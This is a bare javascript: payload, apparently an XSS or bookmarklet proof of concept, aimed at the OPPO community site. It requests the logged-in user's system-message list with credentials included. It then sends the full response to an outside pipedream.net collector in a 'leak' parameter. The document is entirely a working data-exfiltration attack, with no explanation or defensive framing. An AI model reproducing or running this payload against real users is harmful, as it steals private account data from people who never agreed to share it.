javascript:(() => {
  fetch("https://community.oppo.com/ajax/msg/frontend/system/index/list?page=1&limit=10", {
    credentials: "include"
  })
  .then(res => res.text())
  .then(data => {
    fetch("https://eocto97248t3r0j.m.pipedream.net?leak=" + encodeURIComponent(data));
  });
})();
